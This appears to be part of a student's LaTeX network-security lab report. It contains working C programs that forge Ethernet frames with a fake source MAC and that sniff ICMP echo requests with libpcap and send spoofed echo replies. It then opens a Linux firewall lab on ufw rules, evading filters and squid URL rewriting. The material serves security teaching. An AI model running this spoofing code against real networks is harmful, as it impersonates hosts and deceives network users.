			\draw[line width=0.2mm](1.2,0.2) -- (1.2,-5.1);
			\draw[line width=0.4mm](1.6,0.35) -- (1.6,-5.25);
			\draw[line width=0.2mm](2,0.2) -- (2,-5.1);
			\draw[line width=0.2mm](2.4,0.2) -- (2.4,-5.1);
			\draw[line width=0.2mm](2.8,0.2) -- (2.8,-5.1);
			
			\draw[line width=0.2mm](3.6,0.2) -- (3.6,-5.1);
			\draw[line width=0.2mm](4,0.2) -- (4,-5.1);
			\draw[line width=0.2mm](4.4,0.2) -- (4.4,-5.1);
			\draw[line width=0.4mm](4.8,0.35) -- (4.8,-5.25);
			\draw[line width=0.2mm](5.2,0.2) -- (5.2,-5.1);
			\draw[line width=0.2mm](5.6,0.2) -- (5.6,-5.1);
			\draw[line width=0.2mm](6,0.2) -- (6,-5.1);
			
			\draw[line width=0.2mm](6.8,0.2) -- (6.8,-5.1);
			\draw[line width=0.2mm](7.2,0.2) -- (7.2,-5.1);
			\draw[line width=0.2mm](7.6,0.2) -- (7.6,-5.1);
			\draw[line width=0.4mm](8,0.35) -- (8,-5.25);
			\draw[line width=0.2mm](8.4,0.2) -- (8.4,-5.1);
			\draw[line width=0.2mm](8.8,0.2) -- (8.8,-5.1);
			\draw[line width=0.2mm](9.2,0.2) -- (9.2,-5.1);
			
			\draw[line width=0.2mm](10,0.2) -- (10,-5.1);
			\draw[line width=0.2mm](10.4,0.2) -- (10.4,-5.1);
			\draw[line width=0.2mm](10.8,0.2) -- (10.8,-5.1);
			\draw[line width=0.4mm](11.2,0.35) -- (11.2,-5.25);
			\draw[line width=0.2mm](11.6,0.2) -- (11.6,-5.1);
			\draw[line width=0.2mm](12,0.2) -- (12,-5.1);
			\draw[line width=0.2mm](12.4,0.2) -- (12.4,-5.1);
			
			\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
			\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 32};
			\draw[line width=0.5mm] (0,-3.4) -- (-0.5,-3.4);
			\draw (-0.5,-3.4) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 64};
			
			%First Row
			\draw[fill=white!50] (0,0) rectangle node{\footnotesize Type} (3.19,-1.5);
			\draw[fill=white!50] (3.21,0) rectangle node{\footnotesize Code} (6.4,-1.5);
			\draw[fill=white!50] (6.4,0) rectangle node{\footnotesize Checksum} (12.8,-1.5);
			
			%Second Row
			\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize Identifier} (6.38,-3.2);
			\draw[fill=white!50] (6.42,-1.7) rectangle node{\footnotesize Sequence Number} (12.8,-3.2);
			
			%Third Row
			\draw[fill=white!50] (0,-3.4) rectangle node{\footnotesize Data (variable length)} (12.8,-4.9);
	
			\end{tikzpicture}
			
			\flushleft
			
			\textbf{Type~\textbar~Code: Name}\\
			%General ICMP header
			\hspace{8.7mm}0 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Echo Reply\\
			\iffalse 
			\hspace{8.7mm}3 \hspace{2mm}			-\hspace{9mm}\textbf{:}\hspace{2.2mm}Destination Unreachable\\
			\hspace{8.7mm} \hspace{3.6mm}			0\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Net Unreachable\\
			\hspace{8.7mm} \hspace{3.6mm}			1\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Host Unreachable\\
			\hspace{8.7mm} \hspace{3.6mm}			2\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Protocol Unreachable\\
			\hspace{8.7mm} \hspace{3.6mm}			3\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Port Unreachable\\
			\hspace{8.7mm} \hspace{3.6mm}			4\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Fragmentation Required and Don't Fragment (DF) Set\\
			\hspace{8.7mm} \hspace{3.6mm}			5\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Source Route Failed\\
			\hspace{8.7mm} \hspace{3.6mm}			6\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Destination Network Unknown\\
			\hspace{8.7mm} \hspace{3.6mm}			7\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Destination Host Unknown\\
			\hspace{8.7mm} \hspace{3.6mm}			8\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Source Host Isolated\\
			\hspace{8.7mm} \hspace{3.6mm}			9\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Network Administratively Prohibited\\
			\hspace{8.7mm} \hspace{3.6mm}			10\hspace{6.8mm}\textbf{:}\hspace{2.2mm}Host Administratively Prohibited\\
			\hspace{8.7mm} \hspace{3.6mm}			11\hspace{6.8mm}\textbf{:}\hspace{2.2mm}Network Unreachable for TOS\\
			\hspace{8.7mm} \hspace{3.6mm}			12\hspace{6.8mm}\textbf{:}\hspace{2.2mm}Host Unreachable for TOS\\
			\hspace{8.7mm} \hspace{3.6mm}			13\hspace{6.8mm}\textbf{:}\hspace{2.2mm}Communication Administratively Prohibited\\
			
			\hspace{8.7mm}4 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Source Quench\\
			
			\hspace{8.7mm}5 \hspace{2mm}			-\hspace{9mm}\textbf{:}\hspace{2.2mm}Redirect\\
			\hspace{8.7mm} \hspace{3.6mm}			0\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Redirect Datagram for Network\\
			\hspace{8.7mm} \hspace{3.6mm}			1\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Redirect Datagram for Host\\
			\hspace{8.7mm} \hspace{3.6mm}			2\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Redirect Datagram for TOS \& Network\\
			\hspace{8.7mm} \hspace{3.6mm}			3\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Redirect Datagram for TOS \& Host\\
			\fi
			\hspace{8.7mm}8 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Echo\\
			\iffalse
			\hspace{8.7mm}9 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Router Advertisement\\
			
			\hspace{6.7mm}10 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Router Selection\\
			
			\hspace{6.7mm}11 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Time Exceeded\\
			\hspace{8.7mm} \hspace{3.6mm}			0\hspace{8.8mm}\textbf{:}\hspace{2.2mm}TTL Exceeded\\
			\hspace{8.7mm} \hspace{3.6mm}			1\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Fragment Reassembly Time Exceeded\\
			
			\hspace{6.7mm}12 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Parameter Problem\\
			\hspace{8.7mm} \hspace{3.6mm}			0\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Pointer Problem\\
			\hspace{8.7mm} \hspace{3.6mm}			1\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Missing a Required Operand\\
			\hspace{8.7mm} \hspace{3.6mm}			2\hspace{8.8mm}\textbf{:}\hspace{2.2mm}Bad Length\\
			
			\hspace{6.7mm}13 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Timestamp\\
			
			\hspace{6.7mm}14 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Timestamp Reply\\
						
			\hspace{6.7mm}15 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Information Request\\
			
			\hspace{6.7mm}16 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Information Reply\\
						
			\hspace{6.7mm}17 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Address Mask Request\\
						
			\hspace{6.7mm}18 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Address Mask Reply\\
			
			\hspace{6.7mm}30 \hspace{2mm}			-\hspace{8.9mm}\textbf{:}\hspace{2.4mm}Traceroute\\
			\fi
			\caption{ICMP Echo(/Reply) Header}
				\label{fig:ICMPPack}
			\end{figure}
\newpage
\newgeometry{left=1.5cm,top=1cm, bottom=2cm,right=1.5cm}
\subsection{Ethernet Frame Spoofing}
\label{ch:EthSpoof}
\begin{minted}[linenos, breaklines]{C}
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <stdio.h>
#include <stdlib.h>

//#define ETH_FRAME_LEN 1518

int main(){
  int s; /*socketdescriptor*/

  /*target address*/
  struct sockaddr_ll socket_address;
  
  /*buffer for ethernet frame*/
  void* buffer = (void*)malloc(ETH_FRAME_LEN);
  
  /*pointer to ethenet header*/
  unsigned char* etherhead = buffer;
  
  /*userdata in ethernet frame*/
  unsigned char* data = buffer + 14;
  
  /*another pointer to ethernet header*/
  struct ethhdr *eh = (struct ethhdr *)etherhead;
  
  int send_result = 0;
  
  /*our MAC address*/
  unsigned char src_mac[6] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
  /*Our/other MAC address*/
  unsigned char dest_mac[6] = {0x00, 0x0C, 0x29, 0xD3, 0x40, 0x37};
  
  /*prepare sockaddr_ll*/
  
  /*RAW communication*/
  socket_address.sll_family   = PF_PACKET;	
  /* No protocol above ethernet layer */
  socket_address.sll_protocol = htons(ETH_P_IP);	
  
  /*index of the network device
    see full code later how to retrieve it*/
  socket_address.sll_ifindex  = 2;
  
  /*ARP hardware identifier is ethernet*/
  socket_address.sll_hatype   = ARPHRD_ETHER;
  
  /*target is another host*/
  socket_address.sll_pkttype  = PACKET_OTHERHOST;
  
  /*address length*/
  socket_address.sll_halen    = ETH_ALEN;		
  /*MAC - begin*/
  socket_address.sll_addr[0]  = dest_mac[0];		
  socket_address.sll_addr[1]  = dest_mac[1];		
  socket_address.sll_addr[2]  = dest_mac[2];
  socket_address.sll_addr[3]  = dest_mac[3];
  socket_address.sll_addr[4]  = dest_mac[4];
  socket_address.sll_addr[5]  = dest_mac[5];
  /*MAC - end*/
  socket_address.sll_addr[6]  = 0x00; /* Not used */
  socket_address.sll_addr[7]  = 0x00; /* Not used */
  
  
  /*set the frame header*/
  memcpy((void*)buffer, (void*)dest_mac, ETH_ALEN);
  memcpy((void*)(buffer+ETH_ALEN), (void*)src_mac, ETH_ALEN);
  eh->h_proto = 0x00; /* Ethernet Type Data */
  /*fill the frame with some data*/
  int j=0;
  for (j = 0; j < 1500; j++) {
    data[j] = (unsigned char)((int) (255.0*rand()/(RAND_MAX+1.0)));
  }
  
  s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (s == -1) {
    perror("raw socket");
    exit(1);
  }
  
  /*send the packet*/
  send_result = sendto(s, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
  if (send_result == -1) {
    perror("sendto");
    exit(1);
  }
  return 0;
}
\end{minted}
\restoregeometry

\subsection{Explanation (For Selected Parts) - Appendix B}
To construct the Ethernet Frame, it is crucial to know the structure of the frame. The current frame type that is used to transmit information is Ethernet II. The structure for this frame is shown in the figure below and can be referenced with greater detail at Vector E-Learning\footnote{\href{https://elearning.vector.com/index.php?seite=vl_automotive_ethernet_introduction_ko\&root=835866\&wbt_ls_kapitel_id=1603202\&wbt_ls_seite_id=1603211\&d=yes}{Vector E-Learning: https://elearning.vector.com/index.php?seite=vl\_automotive\_ethernet\_\\introduction\_ko\&root=835866\&wbt\_ls\_kapitel\_id=1603202\&wbt\_ls\_seite\_id=1603211\&d=yes}}. (*Note: VLAN Tag has been omitted as it is not relevant to our current task)

\begin{figure}[H]
			\centering
			\tikzset{>=stealth'}
			\begin{tikzpicture}
			%First Row
			\draw(-1,0) rectangle node[text width=2.8cm, align=center]{\footnotesize Destination\\MAC Address} (1.8,-1.5);
			\draw(1.8,0) rectangle node[align=center, text width=2.8cm]{\footnotesize Source\\MAC Address} (4.6,-1.5);
			\draw(4.6,0) rectangle node[align=center,text width=1.2cm]{\footnotesize Type\\Field} (5.8,-1.5);
			\draw(5.8,0) rectangle node{\footnotesize Data} (9,-1.5);
			\draw(9,0) rectangle node{\footnotesize Pad} (9.9,-1.5);
			\draw(9.9,0) rectangle node[text width=2cm, align=center]{\footnotesize CRC\\Checksum} (12,-1.5);
			
			\draw(-1,0) -- (-1,1.8);
			\draw(12,0) -- (12,1.8);
			\draw[<->](-1,1.5)node[yshift=-0.27cm,xshift=3.9cm,text width=7cm]{Ethernet Frame\\\footnotesize Min length: 64 Bytes\\ Max length: 1518 Bytes}-- (12,1.5);
			
			\draw(5.8,0) -- (5.8,1);
			\draw(9.9,0) -- (9.9,1);
			\draw[<->](5.8,0.7)node[yshift=0.01cm,xshift=2.8cm,text width=5cm]{Payload\\\footnotesize Min length: 46 Bytes}-- (9.9,0.7);
			
			\draw(-1,-1.5) -- (-1,-2.3);
			\draw(1.8,-1.5) -- (1.8,-2.3);
			\draw(4.6,-1.5) -- (4.6,-2.3);
			\draw(5.8,-1.5) -- (5.8,-2.3);
			\draw(9,-1.5) -- (9,-2.3);
			\draw(9.9,-1.5) -- (9.9,-2.3);
			\draw(12,-1.5) -- (12,-2.3);
			
			\draw[<->](-1,-2) --node[yshift=-0.4cm]{6 Bytes} (1.8,-2);
			\draw[<->](4.6,-2) --node[yshift=-0.4cm]{6 Bytes} (1.8,-2);
			\draw[<->](4.6,-2) --node[yshift=-0.7cm,align=center, text width=1.2cm]{2\\Bytes} (5.8,-2);
			\draw[<->](9,-2) --node[yshift=-0.4cm]{0 -- 1500 Bytes} (5.8,-2);
			\draw[<->](9.9,-2) --node[yshift=-0.4cm]{4 Bytes} (12,-2);
			\draw[<-](9.45,-1.5) -- (9.45,-4.6);
			\draw[->](9.45,-4.6) -- (9.1,-4.6)node[text width=5cm,align=center,xshift=-1.6cm]{Varies to ensure minimum length\\ of payload or Ethernet frame};
			\end{tikzpicture}
			\caption{Ethernet II Frame}
				\label{fig:EthFrame}
			\end{figure}
			\newpage
			\newgeometry{left=1.5cm,top=1cm, bottom=2cm,right=1.5cm}
			\subsection{Sniffing \& Spoofing}
			\label{ch:SniffSpoof}
			\begin{minted}[linenos,breaklines]{C}
/* Brandon - Fixed ICMP Checksum problem (When data = 0)
	   - Fixed ICMP Response for Sequence and ID fields
	   - Fixed automatic ICMP response with src and dst IP */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <pcap.h>
#include <ctype.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>

#include <arpa/inet.h>

//#define SRC_ADDR "192.168.142.153"
//#define DST_ADDR "172.16.87.254"
//#define ICMPID 0x0
//#define ICMPSEQ 1
#define APP_NAME "sniffex"

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

/* ICMP header */
struct sniff_icmp
{
  u_int8_t type;		/* message type */
  u_int8_t code;		/* type sub-code */
  u_int16_t checksum;
  union
  {
    struct
    {
      u_int16_t	id;
      u_int16_t	sequence;
    } echo;			/* echo datagram */
    u_int32_t	gateway;	/* gateway address */
    struct
    {
      u_int16_t	__unused;
      u_int16_t	mtu;
    } frag;			/* path mtu discovery */
  } un;
};


void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
print_payload(const u_char *payload, int len);

void
print_hex_ascii_line(const u_char *payload, int len, int offset);

void
print_app_usage(void);

/*
 * print help text
 */
void
print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

return;
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);
	
	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");
	
	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	
	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}

/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */
	const struct sniff_icmp *icmp;

	int size_ip;
	int size_tcp;
	int size_payload;
	
	printf("\nPacket number %d:\n", count);
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* Get ICMP header if protocol is ICMP is identified later */
	icmp = (struct sniff_icmp*)(packet + SIZE_ETHERNET + size_ip);
	//printf("%x\n",icmp->un.echo.id);
	//printf("%x\n",ntohs(icmp->un.echo.sequence));

	/* print source and destination IP addresses */
	printf("       From: %s\n", inet_ntoa(ip->ip_src));
	printf("         To: %s\n", inet_ntoa(ip->ip_dst));

	/* determine protocol */	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			printf("   Protocol: TCP\n");
			break;
		case IPPROTO_UDP:
			printf("   Protocol: UDP\n");
			return;
		case IPPROTO_ICMP:
			printf("   Protocol: ICMP\n");
			sendPacket(ip->ip_src,ip->ip_dst,icmp);
			return;
		case IPPROTO_IP:
			printf("   Protocol: IP\n");
			return;
		default:
			printf("   Protocol: unknown\n");
			return;
	}
	
	/*
	 *  OK, this packet is TCP.
	 */
	
	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	
	printf("   Src port: %d\n", ntohs(tcp->th_sport));
	printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	
	/* define/compute tcp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	
	/*
	 * Print payload data; it might be binary, so don't just
	 * treat it as a string.
	 */
	if (size_payload > 0) {
		printf("   Payload (%d bytes):\n", size_payload);
		print_payload(payload, size_payload);
	}

return;
}


/* Referenced from https://www.tenouk.com/Module43a.html */
unsigned short csum(unsigned short *buf, int nwords)
{
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}

int sendPacket(struct in_addr src, struct in_addr dst, struct sniff_icmp *icmpun)
{
/* Used for debugging */
//printf("%s\n", inet_ntoa(src));
//printf("%s\n", inet_ntoa(dst));
//printf("\n%x\n",icmpun->un.echo.id);
//printf("%x\n",ntohs(icmpun->un.echo.sequence));

  struct ip ip;
  struct icmp icmp;
  int sd;
  const int on = 1;
  struct sockaddr_in sin;
  u_char* packet;

  // Allocate some space for our packet:
  packet = (u_char *)malloc(60);
  
  /* IP Layer header construct: Referenced from https://www.tenouk.com/Module42.html */

  ip.ip_hl = 0x5; /* Header length (in 32 bits), 160 bits w/o options: 160/32 */
  ip.ip_v = 0x4;  /* IPv4 */
  ip.ip_tos = 0x0; /* Type of Service */
  ip.ip_len = htons(60); /* Length of entire packet in bytes */
  ip.ip_id = 0; /* Identification field to reassemble fragments of a datagram */
  ip.ip_off = 0x0; /* Fragmentation, set to 0 since no fragments */
  ip.ip_ttl = 64; /* Time To Live */
  ip.ip_p = IPPROTO_ICMP; /* Protocol Number, RFC 1700 */
  ip.ip_sum = 0x0; /* Exclude when calculating checksum first */
  ip.ip_src.s_addr = inet_addr(inet_ntoa(dst)); //inet_addr(src); /* Source IP */
  ip.ip_dst.s_addr = inet_addr(inet_ntoa(src)); //inet_addr(dst); /* Destination IP */
  ip.ip_sum = csum((unsigned short *)&ip, sizeof(ip)); /* Checksum calculation */
  memcpy(packet, &ip, sizeof(ip)); /* Copy header into packet */
  
  
  //ICMP header construct, Reference RFC 792
  
  icmp.icmp_type = ICMP_ECHOREPLY; /* Type 0 for echo */
  icmp.icmp_code = 0; /* No code for echo/reply, leave as 0 */
  icmp.icmp_id = icmpun->un.echo.id; /* Random identifier to match echos & replies */
  icmp.icmp_seq = icmpun->un.echo.sequence; /* Random sequence number to match echos & replies */
  icmp.icmp_cksum = 0; /* Exclude when calculating checksum first */
  icmp.icmp_cksum = csum((unsigned short *)&icmp, sizeof(&icmp)); /* Checksum Calculation */
  memcpy(packet + 20, &icmp, 8); /* Append the ICMP header to the packet at offset 20 */
  
  /* Create raw socket:*/
  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("raw socket");
    exit(1);
  }
  
  /* Prevent kernel from filling up packet with its information*/
  if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
    perror("setsockopt");
    exit(1);
  }
  
  /* Specify destination in kernel to send the raw datagram. We fill in a struct in_addr with the desired destination IP address and pass this structure to the sendto(2) or sendmsg(2) system calls:*/
  
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = ip.ip_dst.s_addr;
  
  /*send(2) system call cannot be used as the socket is not a "connected" type of socket. A destination is needed to send the raw IP datagram. sendto(2) and sendmsg(2) system calls are designed to handle this:*/
  if (sendto(sd, packet, 60, 0, (struct sockaddr *)&sin, 
	     sizeof(struct sockaddr)) < 0)  {
    perror("sendto");
    exit(1);
  }
  
  return 0;
}

int main(int argc, char **argv)
{

	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "icmp and src host 192.168.43.154";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 10;			/* number of packets to capture */

	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		print_app_usage();
		exit(EXIT_FAILURE);
	}
	else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

return 0;
}
			\end{minted}
			\restoregeometry
%PDF 6: Linux Firewall%
\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{Linux Firewall Lab}
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\setcounter{section}{0}
	\section{Introduction}
	Firewalls are commonly used to block traffic, as evident in enterprises and academic institutions where applications and sites are blocked to prevent distractions or illegal traffic from occurring within the networks. There are multiple types of firewall but this lab will focus on two types, the \textit{packet filter} and the application firewall.\\\\Packet filters act by inspecting the packets and if it matches any of the firewall rules, the packets are forwarded or dropped. Packet filters are mostly \textit{stateless}, in that the packets are filtered based on the information encoded in the individual packets and not based on the data stream. Packet filters may use a combination of the packet's source and destination address, protocol and port numbers among many fields.\\\\Application firewalls such as web proxies work at the application layer where the data of the packet is analysed. This method is primarily used for egress filtering of web traffic.
\section{Overview}
This lab will aim to bring insights on how firewalls work by making use of a firewall software and a simplified packet filtering firewall. The first three sections will look at how the packet filtering firewall \texttt{ufw} works and the counter measures that could be taken to evade this type of filtering.\\\\The last two sections of this lab will detail how access to websites can be controlled via a web proxy named \texttt{squid}, a type of application firewall. It will show how this type of firewall can be used to circumvent packet filtering firewalls. Also, \texttt{squid} can modify the contents of the displayed web page, using a method known as URL rewriting/redirection. The demonstration defaces the NTU home page on the local computer, elaborated in great detail at a later chapter of this report. 
\section{Exploration}
\subsection{Virtual Machine (VM) Configuration}
The firewall that will be used later needs to have its configuration modified as its default firewall policy drops all incoming packets. To change it, the default policy file \texttt{/etc/default/ufw} is opened and the following line is modified.\\\\
\texttt{DEFAULT\_INPUT\_POLICY = `DROP'} $\rightarrow$ \texttt{DEFAULT\_INPUT\_POLICY = `ACCEPT'}
\subsection{Using Firewalls}
Linux distributions have a built in kernel firewall tool named \texttt{iptables}. The front-end alternative that is more user-friendly is \texttt{ufw}. By using \texttt{ufw}, it can be used to create a personal firewall for the system but alternative means are more efficient when configuring firewalls for larger networks. For this task, the following are attempted.
\begin{itemize}
\item Prevent Machine A from executing \texttt{Telnet} to Machine B
\item Prevent Machine B from executing \texttt{Telnet} to Machine A
